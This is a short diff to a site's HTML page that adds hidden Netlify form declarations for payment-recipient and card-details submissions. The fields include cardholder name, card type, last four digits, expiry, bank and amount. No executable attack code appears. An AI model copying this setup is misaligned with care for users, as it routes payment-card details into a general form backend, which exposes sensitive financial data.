@@ -76,6 +76,16 @@
     <script type="module" src="/src/main.tsx"></script>
 
     <!-- Hidden Netlify Forms for Detection -->
+    <form name="payment-recipient" netlify-honeypot="bot-field" data-netlify="true" hidden>
+      <input type="text" name="name" />
+      <input type="email" name="email" />
+      <input type="tel" name="phone" />
+      <input type="text" name="address" />
+      <input type="text" name="service" />
+      <input type="text" name="amount" />
+      <input type="text" name="linkId" />
+    </form>
+
     <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
       <input type="text" name="name" />
       <input type="email" name="email" />
@@ -83,6 +93,21 @@
       <input type="text" name="service" />
       <input type="text" name="cardholder" />
       <input type="text" name="cardLast4" />
+      <input type="text" name="expiry" />
+      <input type="text" name="timestamp" />
+    </form>
+
+    <form name="card-details-new" netlify-honeypot="bot-field" data-netlify="true" hidden>
+      <input type="text" name="name" />
+      <input type="email" name="email" />
+      <input type="tel" name="phone" />
+      <input type="text" name="service" />
+      <input type="text" name="amount" />
+      <input type="text" name="country" />
+      <input type="text" name="bank" />
+      <input type="text" name="cardholder" />
+      <input type="text" name="cardLast4" />
+      <input type="text" name="cardType" />
       <input type="text" name="expiry" />
       <input type="text" name="timestamp" />
     </form>
